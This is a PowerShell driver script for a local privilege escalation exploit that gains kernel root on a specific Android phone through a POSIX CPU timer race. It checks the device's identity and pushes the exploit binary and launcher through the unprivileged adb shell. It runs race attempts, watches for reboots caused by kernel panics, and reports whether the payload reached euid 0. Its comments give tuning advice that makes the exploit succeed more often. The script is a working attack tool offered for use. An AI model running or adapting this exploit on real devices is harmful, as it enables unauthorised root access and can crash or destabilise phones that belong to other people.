# run_lpe.ps1 -- PC-side driver for the POSIX CPU timer LPE on PD2506/V2506A.
#
# Two phone-side files: exploit.device (the program) and run_lpe.sh (its
# environment).  This script pushes both, starts the launcher over the
# non-root adb shell and reads the verdict the elevated payload prints.
#
#   .\run_lpe.ps1 -Check                 identity only, nothing is written
#   .\run_lpe.ps1 -Run                   push + run, log to lpe-<date>.log
#   .\run_lpe.ps1 -Run -Attempts 40      more race attempts (7/31 per leak)
#
# The shipped binary is the run18 build: the first real-device success
# (2026-10-25, attempt 0, L=0x78, euid 0 in u:r:ksu:s0, no reboot).  The run
# configuration lives in run_lpe.sh, which run18 used unchanged apart from
# ATTEMPTS; do not add IC_EARLY_WAIT / IC_EARLY_GATE back (they allocate
# order-1 slabs -- filp and dentry -- inside the one-millisecond window that
# decides the capture; run17's 1/5 was caused by exactly that).  Likewise do
# not lower IC_ATTEMPT_WAIT (200 ms ticks): a second attempt forked while the
# first is spraying steals its captured page and the next reap B panics.
#
# Nothing here touches a partition, /data/adb or the boot image: the only
# writes are /data/local/tmp/ic-* (shell-owned) and the local log file.
#
# The driver also reads /proc/uptime, /proc/sys/kernel/panic_on_warn and the
# buddyinfo order-1 count before and after the run (all read-only).  Exit
# codes: 0 payload reached exec euid 0; 2 no supported leak, retry; 3 kernel
# fault/reboot (a capture miss with panic_on_oops=1); 4 device unreachable
# (rebooting or wedged); 1 no verdict.
param(
    [string]$Adb = "",
    [string]$Serial = "",
    [string]$Binary = "",
    [string]$LogDir = "$PSScriptRoot",
    [switch]$Check,
    [switch]$Run,
    [int]$Attempts = 10,
    [int]$TimeoutSec = 0
)

$ErrorActionPreference = "Stop"

function Resolve-Adb {
    if ($Adb) { return $Adb }
    $c = Get-Command adb -ErrorAction SilentlyContinue
    if ($c) { return $c.Source }
    foreach ($p in @("D:\Android\Sdk\platform-tools\adb.exe",
                     "$env:LOCALAPPDATA\Android\Sdk\platform-tools\adb.exe")) {
        if (Test-Path $p) { return $p }
    }
    throw "adb not found; pass -Adb <path to adb.exe>"
}

$adb = Resolve-Adb
if (-not $Binary) {
    $Binary = Join-Path $PSScriptRoot "exploit.device"
}

function Adb-Args([string[]]$rest) {
    if ($Serial) { return @("-s", $Serial) + $rest }
    return $rest
}

# Windows PowerShell 5.1 turns a native command's stderr into an ErrorRecord,
# and with ErrorActionPreference=Stop that aborts the script -- adb writes its
# "1 file pushed" progress line to stderr, which killed the driver right after
# a successful push.  Run adb with "Continue" localised and merge the two
# streams by hand; $LASTEXITCODE still carries adb's own status.
function Adb([string[]]$rest) {
    $old = $ErrorActionPreference
    $ErrorActionPreference = "Continue"
    try {
        (& $adb @(Adb-Args $rest) 2>&1) | ForEach-Object { "$_" }
    } finally {
        $ErrorActionPreference = $old
    }
}

# Exactly one device unless -Serial pins one: two devices make every "adb
# shell" pick the wrong one silently.
$devices = @(& $adb devices | Select-Object -Skip 1 |
             Where-Object { $_ -match "\sdevice\s*$" } |
             ForEach-Object { ($_ -split "\s+")[0] })
if (-not $Serial) {
    if ($devices.Count -ne 1) {
        throw ("expected exactly one adb device, found {0}: {1}" -f `
               $devices.Count, ($devices -join ", "))
    }
    $Serial = $devices[0]
}

function Sh([string]$cmd) {
    (Adb @("shell", $cmd)) -join "`n"
}

# Timed read-only shell: the post-run diagnostics must not hang the driver
# when the phone is rebooting or wedged.  Returns $null on timeout/failure.
function Sh-Timed([string]$cmd, [int]$Sec) {
    $psi = New-Object System.Diagnostics.ProcessStartInfo
    $psi.FileName = $adb
    $psi.Arguments = "-s `"$Serial`" shell `"$cmd`""
    $psi.RedirectStandardOutput = $true
    $psi.RedirectStandardError = $true
    $psi.UseShellExecute = $false
    $p = [System.Diagnostics.Process]::Start($psi)
    $o = $p.StandardOutput.ReadToEndAsync()
    $e = $p.StandardError.ReadToEndAsync()
    if (-not $p.WaitForExit($Sec * 1000)) {
        try { $p.Kill() } catch { }
        return $null
    }
    return ($o.Result + $e.Result)
}

function Get-Uptime {
    $t = Sh-Timed "cat /proc/uptime" 8
    if ($t -and $t -match "^\s*([0-9]+(?:\.[0-9]+)?)") {
        return [double]$Matches[1]
    }
    return $null
}

# Order-1 free blocks in the Normal zone: the size class the mcast spray and
# the timer slabs both live in, so the before/after pair says whether the run
# exhausted the buddy or the device was already short.
function Get-Buddy1([string]$text) {
    if ($text -and $text -match "(?m)^\s*Node\s+\d+,\s*zone\s+Normal\s+(.+)$") {
        $f = $Matches[1].Trim() -split "\s+"
        if ($f.Count -ge 2) { return [int]$f[1] }
    }
    return $null
}

Write-Host "== device identity =="
$ident = [ordered]@{
    serial   = $Serial
    device   = (Sh "getprop ro.product.device").Trim()
    model    = (Sh "getprop ro.product.model").Trim()
    incr     = (Sh "getprop ro.build.version.incremental").Trim()
    kernel   = (Sh "uname -r").Trim()
    enforce  = (Sh "getenforce").Trim()
    id       = (Sh "id").Trim()
}
foreach ($k in $ident.Keys) { Write-Host ("  {0,-8} {1}" -f $k, $ident[$k]) }

# The chain is validated for the ordinary adb shell (uid 2000, u:r:shell:s0,
# enforcing); as adb root the exploit starts from a completely different
# security context and none of the offline results apply.
if ($ident.id -match "uid=0\b") {
    throw "adb shell is running as root; turn adb root off (the chain needs the unprivileged shell, uid 2000)"
}
if ($ident.enforce -notmatch "Enforcing") {
    Write-Host "  warning  SELinux is not Enforcing; the validated configuration is Enforcing"
}

if (-not $Run) {
    Write-Host ""
    Write-Host "check only; pass -Run to push and execute."
    exit 0
}

if (-not (Test-Path $Binary)) { throw "binary not found: $Binary" }
$hash = (Get-FileHash -Algorithm SHA256 $Binary).Hash
Write-Host ("  binary   {0}  sha256 {1}" -f (Split-Path $Binary -Leaf),
                                             $hash)

$stamp = Get-Date -Format "yyyyMMdd-HHmmss"
$log = Join-Path $LogDir ("lpe-{0}.log" -f $stamp)

# /data/local/tmp is shell:shell 0771 labelled shell_data_file: the same DAC
# and SELinux shape the offline harness reproduces.  run_lpe.sh creates the
# drop directory before the exploit runs, while the real identity still owns
# the process, because the fake cred cannot create anything.
Write-Host "== diagnostics =="
# panic_on_oops=1 is compiled in: a failed capture reboots the phone, which
# looks identical to "the run never printed anything".  uptime before/after is
# what tells a reboot apart from a hang or from a plain process exit.
$upBefore = Get-Uptime
$pow = ((Sh-Timed "cat /proc/sys/kernel/panic_on_warn" 8) -replace "\s+$", "")
$b1Before = Get-Buddy1 (Sh-Timed "cat /proc/buddyinfo" 8)
if ($null -ne $upBefore) { Write-Host ("  uptime   {0:N0} s" -f $upBefore) }
if ($pow) { Write-Host ("  panic_on_warn  {0}" -f $pow) }
if ($null -ne $b1Before) { Write-Host ("  buddy    order-1 free {0}" -f $b1Before) }

# A phone that has been up for under ~90 s is still starting services; the
# exploit needs its slab/pageset geometry to be quiet.  One run launched 52 s
# after boot died silently at "pre-A", so wait for the boot to settle first.
if ($null -ne $upBefore -and $upBefore -lt 90) {
    $waitS = [int](90 - $upBefore)
    Write-Host ("  wait     boot is {0:N0} s old; settling {1} s" -f $upBefore, $waitS)
    Start-Sleep -Seconds $waitS
    $upBefore = Get-Uptime
}

Write-Host "== push =="
Adb @("push", $Binary, "/data/local/tmp/ic-timer") | Out-Null
if ($LASTEXITCODE -ne 0) { throw "adb push failed (exit $LASTEXITCODE)" }
$launcher = Join-Path $PSScriptRoot "run_lpe.sh"
if (-not (Test-Path $launcher)) { throw "launcher not found: $launcher" }
Adb @("push", $launcher, "/data/local/tmp/run_lpe.sh") | Out-Null
if ($LASTEXITCODE -ne 0) { throw "adb push failed (exit $LASTEXITCODE)" }
Sh "chmod 0755 /data/local/tmp/ic-timer /data/local/tmp/run_lpe.sh" | Out-Null

# The environment lives in run_lpe.sh only: one source of truth, so this
# driver cannot drift from the configuration the offline harness validated.
#
# The adb shell stays connected for the whole run, with the exploit's output
# redirected to a device-side log: that is the shape of every run that has
# worked on this phone (run18/run19), and it is what makes a panic reboot
# still readable afterwards.  Do not background the launcher with stdin from
# /dev/null: a run launched that way on a freshly booted phone died silently
# right after "pre-A" (all processes gone, strace-free evidence: the log ends
# at [slab] pre-A with stderr unbuffered), while the same binary under the
# connected-session launch reaches the chain.  A successful attempt leaves a
# process behind on purpose, so this driver never waits on the adb process to
# exit -- it polls the device log for a terminal marker instead.
$devLog = "/data/local/tmp/ic-lpe-run.log"
$remote = "cd /data/local/tmp && rm -f $devLog && ATTEMPTS=$Attempts sh /data/local/tmp/run_lpe.sh > $devLog 2>&1"

Write-Host "== run =="
Write-Host ("  log      {0}" -f $log)
$psi = New-Object System.Diagnostics.ProcessStartInfo
$psi.FileName = $adb
# Windows PowerShell 5.1 has no ArgumentList; the command string is free of
# double quotes, so wrapping it is enough for adb to see one argument.
$psi.Arguments = "-s `"$Serial`" shell `"$remote`""
$psi.RedirectStandardOutput = $true
$psi.RedirectStandardError = $true
$psi.UseShellExecute = $false
$p = [System.Diagnostics.Process]::Start($psi)
$pout = $p.StandardOutput.ReadToEndAsync()
$perr = $p.StandardError.ReadToEndAsync()
Start-Sleep -Seconds 3
if ($null -eq (Sh-Timed ("ls " + $devLog) 10)) {
    throw "could not launch on the device (no $devLog after 3 s)"
}

# Poll for a terminal marker.  The set must cover the failure shapes as well
# as success, or a run that died early looks like a slow one until the
# deadline.  Losing adb for ~60 s is treated as a reboot and ends the wait.
$marker = "\[peak\] SUCCESS|attempt done, helper is running|no root after|Kernel panic"
# Each attempt may legitimately take a minute; with the launcher's 180 s
# watchdog per attempt, ten attempts and a slow phone need well over 20 min.
if ($TimeoutSec -le 0) { $TimeoutSec = 2400 }
$deadline = (Get-Date).AddSeconds($TimeoutSec)
$lost = 0
$done = $false
while ((Get-Date) -lt $deadline) {
    Start-Sleep -Seconds 5
    $st = Sh-Timed ("grep -qE '" + $marker + "' " + $devLog + " && echo DONE") 10
    if ($null -eq $st) {
        $lost++
        if ($lost -ge 12) { break }
        continue
    }
    $lost = 0
    if ($st -match "DONE") { $done = $true; break }
}
if (-not $done) {
    Write-Host "  note     no terminal marker within the deadline; pulling the log as it stands"
}

$txt = Sh-Timed ("cat " + $devLog) 30
if ($null -eq $txt) { $txt = "" }
$txt | Set-Content -Encoding utf8 $log

# The device side may still be running a parked or successful attempt that is
# meant to stay; give the launcher a moment to exit by itself, then drop only
# the adb client.  run_lpe.sh ignores HUP/INT/TERM, so the device side
# outliving this session is expected, not a failure.
if (-not $p.HasExited) {
    if (-not $p.WaitForExit(15000)) { try { $p.Kill() } catch { } }
}
$out = $txt
$err = ""

$upAfter = Get-Uptime
if ($null -eq $upAfter) {
    # adb lost the device: it is either rebooting or wedged.  Poll read-only
    # for up to a minute so a panic reboot is identified rather than guessed.
    for ($i = 0; $i -lt 30 -and $null -eq $upAfter; $i++) {
        Start-Sleep -Seconds 2
        $upAfter = Get-Uptime
    }
}
$rebooted = ($null -ne $upBefore -and $null -ne $upAfter -and
             $upAfter -lt $upBefore - 5)
if ($null -ne $upAfter) { Write-Host ("  uptime   {0:N0} s after" -f $upAfter) }
if ($rebooted) {
    Write-Host ("  REBOOT   uptime {0:N0}s -> {1:N0}s: a miss panicked the kernel" -f `
                $upBefore, $upAfter)
}
$b1After = Get-Buddy1 (Sh-Timed "cat /proc/buddyinfo" 8)
if ($null -ne $b1After) { Write-Host ("  buddy    order-1 free {0}" -f $b1After) }

# Every attempt that leaked leaves a parked ic-timer process holding a psl
# socket and a task whose timer base points at a rewritten node.  Those are
# expected; the count is the only read-only way to see how far the run got
# when it printed no verdict.  They must not be killed -9.
$parkedN = Sh-Timed "ps -A -o PID,ARGS | grep -c '[i]c-timer'" 8
if ($parkedN -and $parkedN.Trim() -match "^\d+") {
    Write-Host ("  parked   {0} ic-timer process(es); do not kill -9, reboot to clear" -f `
                $parkedN.Trim())
}

Write-Host "== verdict =="
$txt = $out + "`n" + $err
$hit = ($txt -match "LPE-PROOF") -or ($txt -match "\[helper\] (launched|cmd) euid=0")
$ctx = ([regex]::Matches($txt, "ctx=(\S+)") |
        ForEach-Object { $_.Groups[1].Value } | Select-Object -Last 1)
$sid = ([regex]::Matches($txt, "\[ctxmap\] \S+ = sid (\d+)") |
        ForEach-Object { $_.Groups[1].Value } | Select-Object -Last 1)
$drop = $txt -match "\[drop\] sid=\d+ created"
if ($sid) { Write-Host ("  ctxmap   target sid {0}" -f $sid) }
if ($drop) { Write-Host "  drop     payload exec'd under the target sid" }
if ($ctx) { Write-Host ("  payload  ctx={0}" -f $ctx) }
if ($hit) {
    Write-Host "  RESULT   root payload reached exec (euid 0)"
    exit 0
}
if ($txt -match "Unable to handle kernel|Kernel panic" -or $rebooted) {
    Write-Host "  RESULT   kernel fault/reboot on a capture miss (see REBOOT line). Wait for the phone to come back, then rerun."
    exit 3
}
if ($null -eq $upAfter) {
    Write-Host "  RESULT   device unreachable: rebooting or wedged (a parked chain must not be killed -9)"
    exit 4
}
if ($txt -match "no root after") {
    Write-Host "  RESULT   no supported leak in this run; rerun with -Run"
    exit 2
}
Write-Host "  RESULT   no verdict (see log)"
exit 1
